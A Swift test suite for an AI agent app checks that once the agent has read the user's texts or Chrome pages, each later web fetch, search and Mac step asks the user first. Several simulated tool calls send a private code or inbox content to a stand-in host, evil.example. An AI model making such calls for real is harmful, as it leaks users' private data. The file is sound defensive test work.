                        answers[id] = answer
                        allowed = answer.contains("\"behavior\":\"allow\"")
                        break
                    }
                    try? await Task.sleep(for: .milliseconds(10))
                }
                await onEvent(.toolFinished(toolUseID: "toolu_\(index + 1)", failed: !allowed))
                if allowed, let picture = pictures[index + 1] {
                    await onEvent(.screenPicture(ClaudeTextScreenPicture(toolUseID: "toolu_\(index + 1)",
                                                                         mediaType: "image/png", data: picture)))
                }
                // Stop reaches the child as a cancellation; it ends there, as the transport does.
                if Task.isCancelled { return .cancelled }
            }
        }
        await onEvent(.textSnapshot("Done."))
        return .success(ClaudeTextOnlyReply(sessionID: request.sessionID, actualModel: request.expectedResolvedModel,
            text: "Done.", confirmedActualModel: request.expectedResolvedModel))
    }
}

private actor TextsThenWebProgress {
    static let settled = "(the card settled)"
    private(set) var approvals: [ClaudeTextApproval] = []
    private(set) var activities: [String] = []
    func append(_ progress: ClaudeTextTurnProgress) {
        if case .approvalRequired(let approval) = progress { approvals.append(approval) }
        if case .activity(let line) = progress { activities.append(line) }
        // The verdict line goes to the record alone; its settling marks where it fell.
        if case .approvalResolved = progress { activities.append(Self.settled) }
    }
    func waitForApproval() async -> ClaudeTextApproval? {
        for _ in 0..<800 {
            if let first = approvals.first { return first }
            try? await Task.sleep(for: .milliseconds(10))
        }
        return nil
    }
}

@Suite("After a bot reads the user's texts, every web search and fetch in that reply asks the user")
struct TextsThenWebTests {
    @Test("The CLI is not told to run web tools unasked on a turn that can read the user's texts; without Messages it is, as before")
    func webIsNotPreApprovedBesideMessages() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = TextsThenWebRunner(calls: [])
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: ["any;-;+33612345678"], web: [.webFetch, .webSearch])
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
        let request = try #require(await runner.requests.first)
        #expect(request.asksBeforeWeb && request.preApprovedToolNames.isEmpty)
        let arguments = ClaudeTextOnlyCommandBuilder.arguments(for: request)
        #expect(!arguments.contains("--allowedTools"), "\(arguments)")
        let tools = try #require(arguments.firstIndex(of: "--tools").map { arguments[$0 + 1] })
        #expect(tools.contains("WebFetch") && tools.contains("WebSearch"))
        #expect(!ClaudeTextOnlyCommandBuilder.settingsJSON(for: request).contains("\"WebFetch\""))
    }

    @Test("A fetch before any read goes through; after a read of the user's texts each search and fetch asks, every time")
    func webAsksOnceTextsWereRead() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = TextsThenWebRunner(calls: [
            ("WebFetch", ["url": "https://example.com/a", "prompt": "summary"]),
            ("check_message_service", ["recipient": "+33612345678"]),
            ("WebFetch", ["url": "https://example.com/b", "prompt": "summary"]),
            ("read_messages", ["chat": "+33612345678"]),
            ("WebFetch", ["url": "https://evil.example/?q=the%20code", "prompt": "summary"]),
            ("WebSearch", ["query": "the code is 4412"]),
        ])
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: ["any;-;+33612345678"], web: [.webFetch, .webSearch])
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        let progress = TextsThenWebProgress()
        let turn = Task { await service.sendText(f.submission()) { await progress.append($0) } }
        #expect(await runner.waitForAnswer("req-1")?.contains("\"behavior\":\"allow\"") == true)
        // Checking which service reaches a number reads no text.
        #expect(await runner.waitForAnswer("req-3")?.contains("\"behavior\":\"allow\"") == true)
        #expect(await runner.waitForAnswer("req-4")?.contains("\"behavior\":\"allow\"") == true)
        let fetch = try #require(await progress.waitForApproval())
        #expect(fetch.title == "Let Kite open a web page" || fetch.title.hasSuffix("open a web page"), "\(fetch.title)")
        #expect(fetch.detail.contains("https://evil.example/?q=the%20code") && fetch.detail.contains("read your texts"), "\(fetch.detail)")
        #expect(fetch.turnScopeFolder == nil)
        #expect(!(await service.allowApprovalForTurn(id: fetch.id)))
        #expect(await service.decideApproval(id: fetch.id, allow: false))
        #expect(await runner.waitForAnswer("req-5")?.contains("\"behavior\":\"deny\"") == true)
        var search: ClaudeTextApproval?
        for _ in 0..<800 {
            search = await progress.approvals.dropFirst().first
            if search != nil { break }
            try? await Task.sleep(for: .milliseconds(10))
        }
        let asked = try #require(search)
        #expect(asked.detail.contains("search the web for \"the code is 4412\""), "\(asked.detail)")
        #expect(await service.decideApproval(id: asked.id, allow: true))
        #expect(await runner.waitForAnswer("req-6")?.contains("\"behavior\":\"allow\"") == true)
        #expect(await turn.value.outcome == .completed)
    }

    @Test("Once the user's texts were read, Control this Mac asks for every call and offers no turn allowance")
    func macAsksEveryTimeAfterTexts() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = TextsThenWebRunner(calls: [
            ("mac:press", ["keys": ["tab"], "pid": 999]),
            ("mac:press", ["keys": ["return"], "pid": 999]),
            ("read_messages", ["chat": "+33612345678"]),
            ("mac:type", ["text": "the code is 4412", "pid": 999]),
        ])
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: ["any;-;+33612345678"], withMac: true)
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        let progress = TextsThenWebProgress()
        let turn = Task { await service.sendText(f.submission()) { await progress.append($0) } }
        let first = try #require(await progress.waitForApproval())
        #expect(first.turnScopeFolder != nil)
        #expect(await service.allowApprovalForTurn(id: first.id))
        // The allowance covers the next click, before any text was read.
        #expect(await runner.waitForAnswer("req-2")?.contains("\"behavior\":\"allow\"") == true)
        #expect(await runner.waitForAnswer("req-3")?.contains("\"behavior\":\"allow\"") == true)
        var typed: ClaudeTextApproval?
        for _ in 0..<800 {
            typed = await progress.approvals.dropFirst().first
            if typed != nil { break }
            try? await Task.sleep(for: .milliseconds(10))
        }
        let card = try #require(typed, "typing after the texts were read must ask again")
        #expect(card.turnScopeFolder == nil)
        // The card's words match its buttons: no allowance
        // is offered, so none is described; what is refused and what the user is
        // handed stay.
        #expect(card.detail.contains("It asked to read your texts earlier in this chat, so each step on your Mac asks."), "\(card.detail)")
        #expect(!card.detail.contains("Allow for this turn"), "\(card.detail)")
        #expect(card.detail.contains("Anything aimed at OpenBots' own windows is refused."), "\(card.detail)")
        #expect(card.detail.contains("stop and ask before a deletion."), "\(card.detail)")
        #expect(await service.decideApproval(id: card.id, allow: false))
        #expect(await turn.value.outcome == .completed)
    }
}

/// The user's Chrome, as the service asks about it: open or not, and the
/// tabs it would name. A test may close it between the card and the answer.
final class FixtureChrome: ChromeTabDirectory, @unchecked Sendable {
    private let lock = NSLock()
    private var processID: Int32?
    private var tabs: [Int: ChromeTab]
    private var _lookups = 0
    var lookups: Int { lock.withLock { _lookups } }

    init(open: Bool, tabs: [ChromeTab] = []) {
        processID = open ? 4_242 : nil
        self.tabs = Dictionary(uniqueKeysWithValues: tabs.map { ($0.id, $0) })
    }

    func close() { lock.withLock { processID = nil } }
    /// Quit and started again: another process, the same tab numbers.
    func relaunch() { lock.withLock { processID = (processID ?? 4_242) + 1 } }
    /// The page in a tab went somewhere else.
    func navigate(_ id: Int, to address: String) {
        lock.withLock { tabs[id] = ChromeTab(id: id, title: tabs[id]?.title ?? "", address: address) }
    }
    func chromeProcessID() -> Int32? { lock.withLock { processID } }
    func tab(id: Int) async -> ChromeTabLookup {
        lock.withLock {
            _lookups += 1
            guard processID != nil else { return .unanswered }
            return tabs[id].map(ChromeTabLookup.found) ?? .noSuchTab
        }
    }
}

@Suite("The user's Chrome: every call asks, and once one was approved the web and the Mac ask too")
struct ChromeThenWebTests {
    static let inbox = ChromeTab(id: 7, title: "Inbox (3) – alex – Gmail", address: "https://mail.google.com/mail/u/0/#inbox")

    private func approval(_ progress: TextsThenWebProgress, after count: Int) async -> ClaudeTextApproval? {
        for _ in 0..<800 {
            let approvals = await progress.approvals
            if approvals.count > count { return approvals[count] }
            try? await Task.sleep(for: .milliseconds(10))
        }
        return nil
    }

    @Test("Beside Chrome alone the CLI is not told to run web tools unasked, as beside Messages")
    func webIsNotPreApprovedBesideChrome() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = TextsThenWebRunner(calls: [])
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: [], web: [.webFetch, .webSearch],
                                         withMessages: false, withChrome: true)
        let service = f.service(store, runner: runner, access: access, target: try f.target())
        #expect(await service.sendText(f.submission()) { _ in }.outcome == .completed)
        let request = try #require(await runner.requests.first)
        #expect(request.connectorAccess?.servers.map(\.role) == [.chromeControl])
        #expect(request.asksBeforeWeb && request.preApprovedToolNames.isEmpty)
    }

    @Test("A page read asks on a card naming the tab, with no allowance; after it each fetch and each Mac step asks")
    func aChromeReadFencesTheWebAndTheMac() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = TextsThenWebRunner(calls: [
            ("WebFetch", ["url": "https://example.com/a", "prompt": "summary"]),
            ("chrome:get_page_content", ["tab_id": 7]),
            ("WebFetch", ["url": "https://evil.example/?q=the%20inbox", "prompt": "summary"]),
            ("mac:type", ["text": "the inbox", "pid": 999]),
            ("WebSearch", ["query": "the inbox says 4412"]),
            ("WebFetch", ["url": "https://evil.example/" + String(repeating: "a", count: 1_300), "prompt": "summary"]),
        ])
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: [], web: [.webFetch, .webSearch],
                                         withMac: true, withMessages: false, withChrome: true)
        let chrome = FixtureChrome(open: true, tabs: [Self.inbox])
        let service = f.service(store, runner: runner, access: access, target: try f.target(), chromeTabs: chrome)
        let progress = TextsThenWebProgress()
        let turn = Task { await service.sendText(f.submission()) { await progress.append($0) } }
        // Before anything of the user's was read, a fetch goes through as the
        // switches allow.
        #expect(await runner.waitForAnswer("req-1")?.contains("\"behavior\":\"allow\"") == true)
        let read = try #require(await approval(progress, after: 0))
        #expect(read.title == "Read a page in your Chrome")
        #expect(read.detail.contains("mail.google.com") && read.detail.contains("Inbox (3)"), "\(read.detail)")
        #expect(read.turnScopeFolder == nil)
        #expect(!(await service.allowApprovalForTurn(id: read.id)))
        #expect(await service.decideApproval(id: read.id, allow: true))
        #expect(await runner.waitForAnswer("req-2")?.contains("\"behavior\":\"allow\"") == true)
        let fetch = try #require(await approval(progress, after: 1))
        #expect(fetch.detail.contains("https://evil.example/?q=the%20inbox") && fetch.detail.contains("read from your Chrome"),
                "\(fetch.detail)")
        #expect(fetch.turnScopeFolder == nil)
        #expect(await service.decideApproval(id: fetch.id, allow: false))
        #expect(await runner.waitForAnswer("req-3")?.contains("\"behavior\":\"deny\"") == true)
        let typed = try #require(await approval(progress, after: 2))
        #expect(typed.turnScopeFolder == nil)
        #expect(typed.detail.contains("It read from your Chrome earlier in this chat, so each step on your Mac asks."), "\(typed.detail)")
        #expect(!typed.detail.contains("Allow for this turn"), "\(typed.detail)")
        #expect(await service.decideApproval(id: typed.id, allow: false))
        let search = try #require(await approval(progress, after: 3))
        #expect(search.detail.contains("search the web for \"the inbox says 4412\"") && search.turnScopeFolder == nil,
                "\(search.detail)")
        #expect(await service.decideApproval(id: search.id, allow: false))
        // An address too long to show whole is refused, not cut.
        let long = try #require(await runner.waitForAnswer("req-6"))
        #expect(long.contains("\"behavior\":\"deny\"") && long.contains("whole"), "\(long)")
        #expect(await progress.approvals.count == 4)
        #expect(await turn.value.outcome == .completed)
    }

    @Test("A Chrome read fences the whole session: the next reply's fetch asks, a new session starts unfenced")
    func aChromeReadFencesTheWholeSession() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: [], web: [.webFetch],
                                         withMessages: false, withChrome: true)
        let chrome = FixtureChrome(open: true)
        let first = TextsThenWebRunner(calls: [("chrome:list_tabs", [:])])
        let opener = f.service(store, runner: first, access: access, target: try f.target(), chromeTabs: chrome,
                               sessions: store)
        let progress = TextsThenWebProgress()
        let turn = Task { await opener.sendText(f.submission()) { await progress.append($0) } }
        let list = try #require(await progress.waitForApproval())
        #expect(await opener.decideApproval(id: list.id, allow: true))
        #expect(await turn.value.outcome == .completed)
        let stored = try #require(try await store.storedClaudeSession(conversationID: f.conversationID, teammateID: f.teammateID))
        #expect(stored.readChrome == true && stored.readTexts != true)
        // The next reply continues that session, which still holds what was
        // read: its fetch asks the user.
        // A fresh call for each runner: the input is not Sendable, so one value
        // cannot be handed to two runners (Swift 6.1 refuses it).
        func fetch() -> (tool: String, input: [String: Any]) {
            ("WebFetch", ["url": "https://example.com/b", "prompt": "summary"])
        }
        let second = TextsThenWebRunner(calls: [fetch()])
        let resumed = f.service(store, runner: second, access: access, target: try f.target(), chromeTabs: chrome,
                                sessions: store, transcripts: [stored.sessionID])
        let progress2 = TextsThenWebProgress()
        let turn2 = Task { await resumed.sendText(f.submission()) { await progress2.append($0) } }
        let asked = try #require(await progress2.waitForApproval(), "a fetch in a session that read the user's Chrome must ask")
        #expect(asked.detail.contains("https://example.com/b"), "\(asked.detail)")
        #expect(await resumed.decideApproval(id: asked.id, allow: false))
        #expect(await turn2.value.outcome == .completed)
        #expect(await second.requests.last?.resumesSession == true)
        let kept = try #require(try await store.storedClaudeSession(conversationID: f.conversationID, teammateID: f.teammateID))
        #expect(kept.sessionID == stored.sessionID && kept.readChrome == true)
        // A new session holds nothing of it: the fetch runs unasked, and the
        // new row carries no fence.
        let third = TextsThenWebRunner(calls: [fetch()])
        let fresh = f.service(store, runner: third, access: access, target: try f.target(), chromeTabs: chrome,
                              sessions: store)
        #expect(await fresh.sendText(f.submission()) { _ in }.outcome == .completed)
        #expect(await third.waitForAnswer("req-1")?.contains("\"behavior\":\"allow\"") == true)
        let renewed = try #require(try await store.storedClaudeSession(conversationID: f.conversationID, teammateID: f.teammateID))
        #expect(renewed.sessionID != stored.sessionID && renewed.readChrome != true)
    }

    @Test("An allowance for the Mac given before a Chrome read stops covering the steps after it")
    func aMacAllowanceEndsAtAChromeRead() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = TextsThenWebRunner(calls: [
            ("mac:press", ["keys": ["tab"], "pid": 999]),
            ("mac:press", ["keys": ["tab"], "pid": 999]),
            ("chrome:list_tabs", [:]),
            ("mac:press", ["keys": ["return"], "pid": 999]),
        ])
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: [], withMac: true, withMessages: false,
                                         withChrome: true)
        let service = f.service(store, runner: runner, access: access, target: try f.target(),
                                chromeTabs: FixtureChrome(open: true))
        let progress = TextsThenWebProgress()
        let turn = Task { await service.sendText(f.submission()) { await progress.append($0) } }
        let first = try #require(await approval(progress, after: 0))
        #expect(await service.allowApprovalForTurn(id: first.id))
        #expect(await runner.waitForAnswer("req-2")?.contains("\"behavior\":\"allow\"") == true)
        let list = try #require(await approval(progress, after: 1))
        #expect(list.title == "See your Chrome tabs")
        #expect(await service.decideApproval(id: list.id, allow: true))
        let after = try #require(await approval(progress, after: 2), "the step after a Chrome read must ask again")
        #expect(after.turnScopeFolder == nil)
        #expect(await service.decideApproval(id: after.id, allow: false))
        #expect(await turn.value.outcome == .completed)
    }

    @Test("A tab that went to another site, or a Chrome started again, before the user approves is refused")
    func theTabIsCheckedAgainAtTheApproval() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        for change in ["navigate", "relaunch", "same site"] {
            let weather = ChromeTab(id: 7, title: "Weather", address: "https://evil.example/weather")
            let runner = TextsThenWebRunner(calls: [("chrome:get_page_content", ["tab_id": 7])])
            let access = MessagesChatsAccess(teammateID: f.teammateID, chats: [], withMessages: false, withChrome: true)
            let chrome = FixtureChrome(open: true, tabs: [weather])
            let service = f.service(store, runner: runner, access: access, target: try f.target(), chromeTabs: chrome)
            let progress = TextsThenWebProgress()
            let turn = Task { await service.sendText(f.submission()) { await progress.append($0) } }
            let card = try #require(await progress.waitForApproval())
            #expect(card.detail.contains("evil.example"))
            switch change {
            case "navigate": chrome.navigate(7, to: "https://bank.example/statements")
            case "relaunch": chrome.relaunch()
            default: chrome.navigate(7, to: "https://EVIL.example/radar")
            }
            #expect(await service.decideApproval(id: card.id, allow: true))
            let answer = try #require(await runner.waitForAnswer("req-1"))
            if change == "same site" {
                #expect(answer.contains("\"behavior\":\"allow\""), "\(answer)")
            } else {
                #expect(answer.contains("\"behavior\":\"deny\"") && answer.contains("tab changed"), "\(change): \(answer)")
            }
            #expect(await turn.value.outcome == .completed)
            // The user's press comes first in the record, then why nothing ran
            // ("Blocked" must not read before "Approved").
            if change != "same site" {
                let lines = await progress.activities
                let pressed = lines.firstIndex(of: TextsThenWebProgress.settled)
                let blocked = lines.firstIndex(of: ClaudeTextChromeControlApprovalPolicy.changedActivity)
                #expect(pressed != nil && blocked != nil && pressed! < blocked!, "\(change): \(lines)")
            }
        }
    }

    @Test("A tab with no site that moved is refused too: a file to another file, or any page across schemes")
    func aTabWithNoSiteIsCheckedAgain() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let cases: [(from: String, to: String, refused: Bool)] = [
            ("file:///Users/alex/a.html", "file:///Users/alex/b.html", true),
            ("file:///Users/alex/a.html", "https://bank.example/", true),
            ("chrome://newtab/", "https://bank.example/", true),
            ("https://example.com/a", "file:///Users/alex/a.html", true),
            ("file:///Users/alex/a.html", "file:///Users/alex/a.html#top", false),
        ]
        for item in cases {
            let page = ChromeTab(id: 7, title: "Page", address: item.from)
            let runner = TextsThenWebRunner(calls: [("chrome:get_page_content", ["tab_id": 7])])
            let access = MessagesChatsAccess(teammateID: f.teammateID, chats: [], withMessages: false, withChrome: true)
            let chrome = FixtureChrome(open: true, tabs: [page])
            let service = f.service(store, runner: runner, access: access, target: try f.target(), chromeTabs: chrome)
            let progress = TextsThenWebProgress()
            let turn = Task { await service.sendText(f.submission()) { await progress.append($0) } }
            let card = try #require(await progress.waitForApproval())
            chrome.navigate(7, to: item.to)
            #expect(await service.decideApproval(id: card.id, allow: true))
            let answer = try #require(await runner.waitForAnswer("req-1"))
            let behavior = item.refused ? "\"behavior\":\"deny\"" : "\"behavior\":\"allow\""
            #expect(answer.contains(behavior), "\(item.from) → \(item.to): \(answer)")
            #expect(await turn.value.outcome == .completed)
        }
    }

    @Test("Chrome quit after the card went up: approving sends a refusal, and nothing of the user's was read")
    func chromeQuitBeforeTheAnswer() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = TextsThenWebRunner(calls: [
            ("chrome:list_tabs", [:]),
            ("WebFetch", ["url": "https://example.com/b", "prompt": "summary"]),
        ])
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: [], web: [.webFetch],
                                         withMessages: false, withChrome: true)
        let chrome = FixtureChrome(open: true)
        let service = f.service(store, runner: runner, access: access, target: try f.target(), chromeTabs: chrome)
        let progress = TextsThenWebProgress()
        let turn = Task { await service.sendText(f.submission()) { await progress.append($0) } }
        let list = try #require(await approval(progress, after: 0))
        #expect(list.title == "See your Chrome tabs")
        chrome.close()
        #expect(await service.decideApproval(id: list.id, allow: true))
        let answer = try #require(await runner.waitForAnswer("req-1"))
        #expect(answer.contains("\"behavior\":\"deny\"") && answer.contains("not open"), "\(answer)")
        let lines = await progress.activities
        let pressed = lines.firstIndex(of: TextsThenWebProgress.settled)
        let blocked = lines.firstIndex(of: ClaudeTextChromeControlApprovalPolicy.notOpenActivity)
        #expect(pressed != nil && blocked != nil && pressed! < blocked!, "\(lines)")
        // Nothing was read, so the next fetch is not fenced.
        #expect(await runner.waitForAnswer("req-2")?.contains("\"behavior\":\"allow\"") == true)
        #expect(await turn.value.outcome == .completed)
    }

    @Test("With the user's Chrome closed every call is refused at once, no card and no lookup")
    func closedChromeIsRefused() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let runner = TextsThenWebRunner(calls: [("chrome:list_tabs", [:]), ("chrome:get_page_content", ["tab_id": 7])])
        let access = MessagesChatsAccess(teammateID: f.teammateID, chats: [], withMessages: false, withChrome: true)
        let chrome = FixtureChrome(open: false, tabs: [Self.inbox])
        let service = f.service(store, runner: runner, access: access, target: try f.target(), chromeTabs: chrome)
        let progress = TextsThenWebProgress()
        #expect(await service.sendText(f.submission()) { await progress.append($0) }.outcome == .completed)
        #expect(await runner.answers["req-1"]?.contains("not open") == true)
        #expect(await runner.answers["req-2"]?.contains("not open") == true)
        #expect(await progress.approvals.isEmpty)
        #expect(chrome.lookups == 0)
    }

    @Test("Opening an address needs web access; with it the card shows the whole address, never blanked")
    func openingAnAddress() async throws {
        let f = try WebGrantFixture()
        defer { f.remove() }
        let store = try f.open()
        try await f.seed(store)
        let address = "https://example.com/search?q=swift+6&page=2"
        for web in [Set<ClaudeTextOnlyTool>(), [.webFetch]] {
            let runner = TextsThenWebRunner(calls: [("chrome:open_url", ["url": address])])
            let access = MessagesChatsAccess(teammateID: f.teammateID, chats: [], web: web,
                                             withMessages: false, withChrome: true)
            let service = f.service(store, runner: runner, access: access, target: try f.target(),
                                    chromeTabs: FixtureChrome(open: true))
            let progress = TextsThenWebProgress()
            let turn = Task { await service.sendText(f.submission()) { await progress.append($0) } }
            if web.isEmpty {
                let answer = try #require(await runner.waitForAnswer("req-1"))
                #expect(answer.contains("\"behavior\":\"deny\"") && answer.contains("web access"), "\(answer)")
            } else {
                let card = try #require(await progress.waitForApproval())
                #expect(card.title == "Open a page in your Chrome")
                #expect(card.detail.hasSuffix(address), "\(card.detail)")
                #expect(card.turnScopeFolder == nil)
                #expect(await service.decideApproval(id: card.id, allow: false))
            }
            #expect(await turn.value.outcome == .completed)
        }
    }

    @Test("No web worker starts after a read of the user's texts or the user's Chrome; a local one does")
    func webWorkersAreFenced() throws {
        func call(_ kind: String) throws -> ClaudeTextWorkerCall {
            ClaudeTextWorkerCall(requestID: "w", toolUseID: "toolu_w",
                argumentsJSON: try JSONSerialization.data(withJSONObject: ["brief": "look it up", "kind": kind]),
                isOwnCall: true)
        }
        typealias Service = OfficialClaudeTextReplyService
        #expect(Service.webWorkerFence(try call("web"), readTexts: false, readChrome: false) == nil)
        #expect(Service.webWorkerFence(try call("web"), readTexts: true, readChrome: false) == .webAfterTexts)
        #expect(Service.webWorkerFence(try call("web"), readTexts: false, readChrome: true) == .webAfterChrome)
        #expect(Service.webWorkerFence(try call("local"), readTexts: true, readChrome: true) == nil)
        // Any private read, in its own words.
        #expect(Service.webWorkerFence(try call("web"), readTexts: false, readChrome: false, readOther: .appleMailRead)
                == .webAfterPrivateRead("his Mail"))
        #expect(Service.webWorkerFence(try call("local"), readTexts: false, readChrome: false, readOther: .googleDriveRead) == nil)
    }
}
